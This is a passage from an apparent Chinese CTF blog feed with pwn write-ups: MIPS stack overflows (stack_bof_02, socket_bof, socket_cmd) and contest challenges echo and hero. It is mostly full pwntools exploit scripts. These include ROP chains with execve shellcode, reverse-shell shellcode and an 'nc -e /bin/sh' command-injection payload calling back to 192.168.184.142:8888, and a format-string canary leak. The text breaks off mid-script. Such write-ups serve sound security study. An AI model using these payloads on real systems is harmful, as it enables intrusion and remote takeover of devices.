class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C4C <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B0 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s0</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C50 <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   <span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">t9</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C54 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">BD </span><span class="hljs-number">27</span>                   <span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p>最后使用mipsrop.stackfinders()找到获取栈地址的相对偏移的gadget；使用mipsrop.tail()或mipsrop.find(“”)找到跳转地址的gadget，通过偏移量写入shellcode，找出如下gadget：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0001B230</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">00</span> <span class="hljs-number">02</span>                   move    $t9, $s0<br>.text:<span class="hljs-number">0001B234</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">0001B238</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_10<br><br>.text:<span class="hljs-number">000214A0</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">80</span> <span class="hljs-number">00</span>                   move    $t9, $a0<br>.text:<span class="hljs-number">000214A4</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A2 AF                   sw      $v0, <span class="hljs-number">0x30</span>+var_18($sp)<br>.text:<span class="hljs-number">000214A8</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">000214AC</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x30</span>+var_18<br></code></pre></td></tr></table></figure><p>​                             </p><p>完整的ROP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a2, $zero, -1</span><br><span class="hljs-string">    li $t7, 0x69622f2f</span><br><span class="hljs-string">    sw $t7, -12($sp)</span><br><span class="hljs-string">    li $t6, 0x68732f6e</span><br><span class="hljs-string">    sw $t6, -8($sp)</span><br><span class="hljs-string">    sw $zero, -4($sp)</span><br><span class="hljs-string">    la $a0, -12($sp)</span><br><span class="hljs-string">    slti $a1, $zero, -1</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x40404</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>最后调用该payload</p><img src="/img/5/Screenshot_20221111_032920.png" style="zoom:67%;" /><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>H4lo师傅第一个版本的ROP通过mipsrop.stackfinders()是找到 <code>0x000171CC</code> 这一处的 gadget：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>CC <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_20<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D0 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s3<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D4 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">24</span>                   li      $a1, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后也是通过<code>0x000214A0</code> 的gadget跳转到shellcode，<code>0x000171CC</code> 处的 gadget获取栈地址的相对偏移是sp + 0x18，并依此写入0x18字节的数据填充，然后写入shellcode，而<code>0x000214A0</code> 处会有<code>sw   $v0, 0x18($sp)</code>的操作，最后会将shellcode的前4位字节赋值为$v0寄存器的值，如下图：</p><img src="/img/5/Screenshot_20221110_053319.png" style="zoom: 80%;" /><p>虽然最后也可以成功执行shellcode，但是对于后面的socket_bof这种题就无法成功；所以最好继续多写入4字节的数据填充，然后写入shellcode，这样就不会让shellcode上的数据被修改。</p><p>不过H4lo师傅第二个版本的ROP就没有使用该处的gadget。</p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><p>使用ida查看伪代码：</p><p><img src="/img/5/Screenshot_20221111_090157.png"></p><p>read函数输入字符到v10上后，再由sprintf函数将v10的字符加上“nom nom nom, you sent me ”这串字符一同复制到v11上，最后的溢出也是v11的溢出，所以在调试时在栈上应找到如下地址去计算溢出长度：</p><img src="/img/5/Screenshot_20221111_093723.png" style="zoom: 80%;" /><p>溢出后的ROP可以直接使用上一题stack_bof_02的，最后将shellcode改为可以反弹shell的代码。</p><p>可以参考shell-storm上的<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">代码</a>，再改一下ip和端口即可</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a0, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a0, $zero, 0x1111</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    not $a1, $t4</span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4183</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    andi $a0, $v0, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $a1, 0xB821 # Port: 8888</span><br><span class="hljs-string">    ori $a1, 0xFF01</span><br><span class="hljs-string">    addi $a1, $a1, 0x0101</span><br><span class="hljs-string">    sw $a1, -8($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $a1, 0x8EB8A8C0 # IP: 192.168.184.142</span><br><span class="hljs-string">    sw $a1, -4($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFEF</span><br><span class="hljs-string">    not $a2, $t4</span><br><span class="hljs-string">    li $v0, 4170</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6962</span><br><span class="hljs-string">    ori $t0, $t0,0x2f2f</span><br><span class="hljs-string">    sw $t0, -20($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6873</span><br><span class="hljs-string">    ori $t0, 0x2f6e</span><br><span class="hljs-string">    sw $t0, -16($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a3, $zero, 0xFFFF</span><br><span class="hljs-string">    sw $a3, -12($sp)</span><br><span class="hljs-string">    sw $a3, -4($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addi $a0, $sp, -20</span><br><span class="hljs-string">    addi $t0, $sp, -20</span><br><span class="hljs-string">    sw $t0, -8($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addiu $sp, $sp, -20</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行exp</p><p><img src="/img/5/Screenshot_20221111_090644.png"></p><h3 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h3><p>使用snprintf函数，控制大小为0x64，程序无栈溢出漏洞。将v10的字符直接拿去和“echo ”拼接后去作为system的参数，然后输出字符串；可以使用‘&amp;’字符，当执行完输出后继续执行自己写入的命令。</p><p><img src="/img/5/Screenshot_20221112_023231.png"></p><p>就有如下exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>也可以反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>cmd = <span class="hljs-string">b&#x27;nc -e /bin/sh 192.168.184.142 8888&#x27;</span><br>payload = <span class="hljs-string">b&#x27;a &amp;&#x27;</span> + cmd<br>p.sendafter(<span class="hljs-string">b&#x27;Send me a string:&#x27;</span>, payload)<br></code></pre></td></tr></table></figure><p>执行后：<br><img src="/img/5/Screenshot_20221112_023610.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022天津市大学生信息安全网络攻防决赛 pwn</title>
    <link href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/"/>
    <url>/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>比赛时间只有3个小时，这里我只写出了echo、hero，还一道choice没时间去写了，后续自己在本地复现了一下。</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>格式化字符串漏洞</p><p><img src="/img/3/Screenshot_20221105_115756.png"></p><p>先利用格式字符串读出canary的值绕过检查</p><p>利用格式字符串修改0x601068地址的值，修改为字符串<code>/bin/sh\x00</code></p><p>再利用栈溢出和system函数执行ROP</p><p><img src="/img/3/Screenshot_20221105_121837.png"></p><p>开始我想一次性修改多个字节，但好像有canary以及缓冲区太小的原因，当时一直不成功，所以就每次只修改一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;echo&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./echo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50004</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>bss = <span class="hljs-number">0x601068</span><br><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;%11$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>bin_sh = <span class="hljs-number">0x0068732f6e69622f</span><br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%98c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">1</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%105c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%110c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">3</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%47c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%115c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">5</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%104c%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">6</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br>pay = <span class="hljs-string">b&#x27;%10$hhn&#x27;</span><br>pay = pay.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pay += p64(bss + <span class="hljs-number">7</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,pay)<br><br><br>payload = <span class="hljs-string">b&#x27;quit&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) +  p64(<span class="hljs-number">0x4005e9</span>) + p64(<span class="hljs-number">0x400903</span>) + p64(bss) + p64(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h3><p>在edit函数中有个单字节溢出</p><p><img src="/img/3/Screenshot_20221105_120111.png"></p><p>可以伪造修改下一个堆块的prev_size大小和size尾字节为\x00，在申请释放会本来正常申请的堆块合并。</p><p>最后利用fastbin二次释放，指向malloc_hook，<code>__realloc_hook改为onegadget</code> ， <code>__malloc_hook改为__libc_reallo</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hero&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc_64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./hero&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;172.31.1.105&#x27;</span>,<span class="hljs-number">50005</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name, power</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, name, power</span>):<br>    p.sendlineafter(<span 